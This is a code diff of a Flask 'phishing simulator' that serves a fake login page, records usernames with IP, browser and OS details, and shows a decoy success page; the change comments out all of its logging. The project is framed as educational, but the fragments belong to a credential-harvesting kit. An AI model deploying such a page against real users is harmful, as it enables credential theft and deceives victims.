@@ -30,7 +30,7 @@ logging.basicConfig(
         logging.StreamHandler()
     ]
 )
-logger = logging.getLogger("phishing_simulator")
+# logger = logging.getLogger("phishing_simulator")
 
 # Ensure the log files and directories exist
 LOG_FILE = 'captured_credentials.txt'
@@ -73,7 +73,7 @@ def rate_limit(max_requests=5, window=60):
             
             # Check if rate limit exceeded
             if len(request_history.get(ip, [])) >= max_requests:
-                logger.warning(f"Rate limit exceeded for IP: {ip}")
+                # logger.warning(f"Rate limit exceeded for IP: {ip}")
                 return jsonify({"error": "Rate limit exceeded"}), 429
             
             # Add current request timestamp
@@ -232,9 +232,10 @@ def background_analysis(session_id, captured_data):
         with open(analysis_file, 'w') as f:
             json.dump(analysis, f, indent=2)
             
-        logger.info(f"Completed background analysis for session {session_id}")
+        # logger.info(f"Completed background analysis for session {session_id}")
     except Exception as e:
-        logger.error(f"Error in background analysis: {e}")
+        # logger.error(f"Error in background analysis: {e}")
+        pass
 
 
 def update_statistics(data):
@@ -256,9 +257,10 @@ def update_statistics(data):
 
         # --- Vercel Change: Remove saving stats to file ---
         # with open(os.path.join(ANALYTICS_DIR, 'statistics.json'), 'w') as f: ...
-        logger.info("In-memory statistics updated.")
+        # logger.info("In-memory statistics updated.")
     except Exception as e:
-        logger.error(f"Error updating statistics: {e}")
+        # logger.error(f"Error updating statistics: {e}")
+        pass
 
 
 @app.route('/')
@@ -267,7 +269,8 @@ def login_page():
     """Serves the fake login page."""
     # In a real phishing attack, this page would be styled
     # meticulously to look like the target (e.g., Amazon).
-    logger.info("Serving login page...")
+    
+    # logger.info("Serving login page...")
     
     # Track visit
     stats["total_visits"] += 1
@@ -400,14 +403,14 @@ def submit_login():
             }
         }
 
-        logger.info(f"--- Credential Submission ---")
-        logger.info(f"Timestamp: {timestamp}")
-        logger.info(f"Session ID: {session_id}")
-        logger.info(f"Username: {username}")
-        logger.info(f"IP Address: {ip_address}")
-        logger.info(f"Browser: {browser}")
-        logger.info(f"OS: {os_info}")
-        logger.info(f"---------------------------")
+        # logger.info(f"--- Credential Submission ---")
+        # logger.info(f"Timestamp: {timestamp}")
+        # logger.info(f"Session ID: {session_id}")
+        # logger.info(f"Username: {username}")
+        # logger.info(f"IP Address: {ip_address}")
+        # logger.info(f"Browser: {browser}")
+        # logger.info(f"OS: {os_info}")
+        # logger.info(f"---------------------------")
 
         # --- !!! DANGER ZONE !!! ---
         # For EDUCATIONAL DEMONSTRATION ONLY.
@@ -476,7 +479,7 @@ def success_page():
     """Displays a generic success/confirmation page."""
     # This page simulates what the user might see after
     # submitting their details on the fake page.
-    logger.info("Serving success/decoy page...")
+    # logger.info("Serving success/decoy page...")
     return render_template('success.html')
 
 @app.route('/api/stats', methods=['GET'])
@@ -505,7 +508,8 @@ def api_stats():
             }
         })
     except Exception as e:
-        logger.error(f"Error in stats API: {e}")
+        # logger.error(f"Error in stats API: {e}")
+        pass
         return jsonify({"status": "error", "message": str(e)})
 
 # @app.route('/api/sessions/<session_id>', methods=['GET'])
